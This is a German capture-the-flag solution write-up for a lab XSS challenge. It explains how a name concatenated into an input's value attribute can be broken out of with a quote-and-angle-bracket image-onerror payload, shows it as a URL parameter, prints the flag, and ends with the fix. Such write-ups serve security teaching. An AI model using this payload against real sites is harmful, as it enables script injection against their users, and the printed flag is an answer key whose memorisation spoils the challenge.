# 🔓 Lösung — XSS-03 ProfilCard

> ⚠️ Spoiler.

## Kontext

`renderCard` baut per String-Konkatenation:
```js
'<input type="text" readonly value="' + name + '" ...>'
```
Dein Name steht **im Attribut-Wert** `value="..."`. Ein reines `<img ...>` bleibt als
Text im Wert stehen — der Browser sieht es als Inhalt des Attributs, nicht als Tag.

## Ausbruch

Erst den Wert mit `"` schließen, dann das `<input>`-Tag mit `>` schließen, dann ein
eigenes Tag mit selbst-feuerndem Handler anhängen:

```html
"><img src=x onerror=showFlag()>
```

Ergebnis im DOM:
```html
<input type="text" readonly value=""><img src=x onerror=showFlag()> ...>
```
Das `value` ist leer geschlossen, das `<img>` ist ein neues Tag, `src=x` schlägt fehl →
`onerror` → `showFlag()`. ✅

Als URL: `index.html?name="><img src=x onerror=showFlag()>`

## 🚩 Flag
```
TELQRR{4ttr1but3_4usbruch_m1t_quote_gt}
```

## Richtig machen
`el.setAttribute('value', name)` oder `input.value = name` statt String-`innerHTML`;
alternativ `"` als `&quot;` encoden. Dann ist kein Ausbruch möglich.
